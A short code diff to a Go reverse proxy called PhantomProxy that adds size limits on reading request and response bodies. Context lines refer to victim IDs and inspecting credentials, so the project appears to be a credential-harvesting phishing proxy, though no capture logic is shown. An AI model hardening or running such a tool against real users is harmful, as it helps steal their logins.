@@ -78,10 +78,12 @@ func (pp *PhantomProxy) ServeHTTP(w http.ResponseWriter, req *http.Request) {
 	victimID := pp.getOrSetVictimID(w, req)
 
 	// Read body once, copy for both credential inspection and proxy forwarding
+	// Limit body to 10MB to prevent OOM from oversized payloads
+	const maxBodySize = 10 * 1024 * 1024
 	var bodyBytes []byte
 	if req.Body != nil {
 		var err error
-		bodyBytes, err = io.ReadAll(req.Body)
+		bodyBytes, err = io.ReadAll(io.LimitReader(req.Body, maxBodySize))
 		req.Body.Close()
 		if err != nil {
 			log.Printf("[!] Failed to read request body: %v", err)
@@ -206,7 +208,7 @@ func (pp *PhantomProxy) rewriteResponse(resp *http.Response) {
 		reader = resp.Body
 	}
 
-	body, err := io.ReadAll(reader)
+	body, err := io.ReadAll(io.LimitReader(reader, 50*1024*1024))
 	if err != nil {
 		return
 	}
